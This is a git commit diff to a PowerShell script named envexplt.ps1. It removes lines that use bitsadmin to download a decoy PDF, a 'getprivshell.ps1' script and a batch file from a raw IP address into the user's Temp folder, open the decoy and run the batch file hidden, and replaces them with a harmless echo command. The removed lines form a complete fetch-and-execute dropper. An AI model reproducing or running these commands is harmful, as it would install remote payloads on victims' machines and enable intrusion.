27e12a10a6630b4cc29c5ca602510fc2d06cabc4
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2023-04-01 12:11:53 -0700

    Update envexplt.ps1

--- envexplt.ps1
+++ envexplt.ps1
@@ -1,6 +1,1 @@
-bitsadmin /transfer Explorers /download /priority FOREGROUND http://66.228.37.7/ncat/mypdf.pdf $env:USERPROFILE\AppData\Local\Temp\mypdf.pdf
-cd $env:USERPROFILE\AppData\Local\Temp
-start mypdf.pdf
-bitsadmin /transfer Explorers /download /priority FOREGROUND http://66.228.37.7/ncat/getprivshell.ps1 $env:USERPROFILE\AppData\Local\Temp\getprivshell.ps1
-bitsadmin /transfer Explorers /download /priority FOREGROUND http://66.228.37.7/ncat/writer.bat $env:USERPROFILE\AppData\Local\Temp\writer.bat
-start writer.bat -windowstyle Hidden
+start powershell -Args 'echo hello ; sleep 10'
